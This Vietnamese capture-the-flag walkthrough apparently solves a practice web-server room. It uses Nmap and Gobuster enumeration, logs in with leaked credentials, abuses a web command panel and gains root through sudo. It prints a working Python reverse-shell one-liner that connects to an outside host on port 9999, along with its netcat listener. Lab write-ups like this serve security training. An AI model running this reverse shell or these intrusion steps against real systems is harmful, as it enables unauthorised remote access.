- Quet Nmap ta thay duoc 2 cong

![image](https://github.com/user-attachments/assets/eaa10548-4d6f-4162-86b2-7f7131a814c1)

- Xem ma nguon ta thay co username

![image](https://github.com/user-attachments/assets/aeeaa657-384b-431d-9838-be346cf08584)

- Mình sẽ sử dụng Gobuster để tìm thêm một số file hoặc directory ẩn:

gobuster dir -u http://10.10.245.218/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 20 -x php,txt,html

Gobuster sẽ sử dụng wordlist để dò các directory ẩn trên IP, đồng thời thử thêm cả đuôi file php, txt, html.

![image](https://github.com/user-attachments/assets/0cbec98e-1a4a-4233-8a85-9784ae69feee)

![image](https://github.com/user-attachments/assets/87081490-f605-4dfb-824b-358779586bdf)

![image](https://github.com/user-attachments/assets/f429b40c-a4bc-489d-a579-cb9a7c7a52ea)

![image](https://github.com/user-attachments/assets/139464d5-58c3-4131-b55b-256c1ad8b55a)

Sử dụng “R1ckRul3s” làm username và “Wubbalubbadubdub” làm mật khẩu là ta đã có thể đăng nhập thành công:

![image](https://github.com/user-attachments/assets/9f948b77-d625-46b9-9b3a-bc183abc7e9b)

![image](https://github.com/user-attachments/assets/95778781-f982-4ce2-8c2b-2e4c2930cdcb)

Sau khi su dung lenh `ls` thi ta duoc liet ke rat nhieu tep

![image](https://github.com/user-attachments/assets/6d414e0c-3248-4489-8ed1-09b3857f5c1e)


- Sau khi

![image](https://github.com/user-attachments/assets/f950d098-e059-442e-aa28-fac6340842e1)

- Ta duoc

![image](https://github.com/user-attachments/assets/cdd050ce-1e7b-4484-b382-d3fd20682a7d)

- Vay la command `cat` da bi chan , ta dung `less` thay the

![image](https://github.com/user-attachments/assets/5c713ceb-b33f-4998-9782-
feb84d56a74d)

- ta duoc `key cau dau tien`

Để tiện tương tác mình sẽ tạo reverse connection ra bên ngoài và thực thi shell trên đó:

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.1.100",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

Trước đó mở cổng 9999 trên máy mình để chờ kết nối về:

`nc -lvnp 9999`

- Chạy dòng python3 kia vào trường command trên web và ta đã có shell để bắt đầu tương tác:


![image](https://github.com/user-attachments/assets/50699003-d009-44d3-b8de-d1662dff6bfc)


![image](https://github.com/user-attachments/assets/21952830-ad97-461e-b596-42f8725e3026)

Ta có thể tìm được nguyên liệu thứ 2 luôn tại đây. Với nguyên liệu thứ 3, mình cũng đã thử tìm khắp hệ thống nhưng không thấy. Vậy nên mình sẽ tìm cách nâng quyền lên root để tìm trong những thư mục chỉ root mới truy cập được

find / -perm -u=s -type f 2>/dev/null


![image](https://github.com/user-attachments/assets/ece6a3e1-c20b-4454-8018-b3a80ee867ea)

- Đây rồi! Bin sudo hiện ra như cho. Thực ra sẽ chẳng bao giờ sudo lại được cấu hình để cho phép mọi người dùng nó như root, thật vô nghĩa :)) Nhưng đây là CTF mà *educational purpose*. Sử dụng sudo ta có thể tìm thấy nguyên liệu cuối được giấu trong folder root:


![image](https://github.com/user-attachments/assets/18091023-dd03-40ed-ad83-d13c6117177d)


![image](https://github.com/user-attachments/assets/12f4a6ad-595b-4a3d-834e-3d23175126f7)
